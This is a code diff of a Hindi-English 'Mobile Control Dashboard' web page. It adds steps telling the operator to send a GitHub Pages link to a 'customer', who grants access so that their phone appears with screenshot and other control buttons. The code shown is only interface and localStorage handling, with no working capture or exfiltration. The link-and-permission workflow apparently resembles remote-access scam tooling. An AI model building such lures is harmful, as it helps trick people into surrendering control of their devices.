@@ -29,8 +29,21 @@
         }
         .header h1 {
             color: #667eea;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
             font-size: 28px;
+        }
+        .instructions {
+            background: #f0f7ff;
+            border-left: 4px solid #667eea;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #333;
+            line-height: 1.6;
+        }
+        .instructions strong {
+            color: #667eea;
         }
         .refresh-btn {
             background: #667eea;
@@ -231,12 +244,28 @@
         .cancel-btn:hover {
             background: #bbb;
         }
+        .pulse {
+            animation: pulse-animation 2s infinite;
+        }
+        @keyframes pulse-animation {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
     </style>
 </head>
 <body>
     <div class="dashboard">
         <div class="header">
             <h1>🎮 Mobile Control Dashboard</h1>
+            
+            <div class="instructions">
+                <strong>📱 कैसे काम करेगा:</strong><br>
+                1. यह link अपने customer को भेजो: <span style="color: #667eea; font-family: monospace;">https://niharika99057-netizen.github.io/mobile-remote-control/</span><br>
+                2. Customer link पर click करे<br>
+                3. "हाँ, एक्सेस दो" दबाए<br>
+                4. <strong>तुरंत यहाँ device दिखेगा!</strong> 🟢
+            </div>
+
             <button class="refresh-btn" onclick="refreshDevices()">🔄 Refresh Now</button>
             <span id="refreshStatus" style="color: #667eea; font-weight: bold;"></span>
         </div>
@@ -279,10 +308,10 @@
                 container.innerHTML = `
                     <div class="no-devices">
                         <h2>📱 कोई Device जुड़ा नहीं है</h2>
-                        <p>जब कोई customer link को click करेगा और permission देगा, तो यहाँ दिखेगा।</p>
+                        <p>जब कोई customer आपका link खोलेगा और permission देगा,<br>तो यहाँ device दिखेगा! 🟢</p>
                         <br>
-                        <p style="font-size: 14px; color: #999;">💡 Hint: Customer को यह link भेजो:</p>
-                        <p style="font-size: 12px; color: #667eea; font-family: monospace; background: #f5f5f5; padding: 10px; border-radius: 5px;">https://niharika99057-netizen.github.io/mobile-remote-control/</p>
+                        <p style="font-size: 14px; color: #999;">💡 Customer को यह link भेजो:</p>
+                        <p style="font-size: 12px; color: #667eea; font-family: monospace; background: #f5f5f5; padding: 10px; border-radius: 5px; margin-top: 8px;">https://niharika99057-netizen.github.io/mobile-remote-control/</p>
                         <button class="control-btn" onclick="refreshDevices()" style="max-width: 200px; margin: 20px auto 0; width: 100%;">🔄 Refresh करो</button>
                     </div>
                 `;
@@ -292,16 +321,16 @@
             container.innerHTML = `
                 <div class="devices-grid">
                     ${devices.map((device, index) => `
-                        <div class="device-card">
+                        <div class="device-card pulse">
                             <div class="device-header">
-                                <h2>Device ${index + 1}</h2>
+                                <h2>📱 Customer ${index + 1}</h2>
                                 <span class="status">🟢 Online</span>
                             </div>
                             <div class="device-info">
-                                <p><strong>📱 Device ID:</strong> ${device.id}</p>
-                                <p><strong>🔑 Access Code:</strong> ${device.accessCode}</p>
-                                <p><strong>⏰ Connected:</strong> ${new Date(device.timestamp).toLocaleTimeString()}</p>
+                                <p><strong>🆔 Device ID:</strong> ${device.id}</p>
+                                <p><strong>⏰ Connected:</strong> ${device.connectedTime}</p>
                                 <p><strong>📍 Status:</strong> ${device.lastActivity}</p>
+                                <p><strong>🔑 Code:</strong> ${device.accessCode}</p>
                             </div>
                             <div class="controls">
                                 <button class="control-btn" onclick="showControlModal(${index}, 'स्क्रीनशॉट ले सकते हो?', 'screenshot')">📸 Screenshot</button>
@@ -328,21 +357,17 @@
 
         function removeDevice(index) {
             if (confirm('क्या आप इस device को disconnect करना चाहते हैं?')) {
+                const code = devices[index].accessCode;
                 devices.splice(index, 1);
                 localStorage.setItem('connectedDevices', JSON.stringify(devices));
                 loadDevices();
-                addActivityLog('❌ Device Disconnected');
+                addActivityLog('❌ Device Disconnected: ' + code);
                 alert('✅ Device disconnect हो गया!');
             }
         }
 
         function loadActivityLogs() {
             activityLogs = JSON.parse(localStorage.getItem('activityLogs')) || [];
-            if (activityLogs.length === 0) {
-                activityLogs = [
-                    { time: new Date().toLocaleTimeString(), action: '🔄 Dashboard Started' }
-                ];
-            }
             renderActivityLog();
         }
 
@@ -403,10 +428,10 @@
             loadActivityLogs();
         });
 
-        // Auto-refresh every 3 seconds
+        // Auto-refresh every 1 second for real-time updates
         setInterval(() => {
             loadDevices();
-        }, 3000);
+        }, 1000);
     </script>
 </body>
 </html>
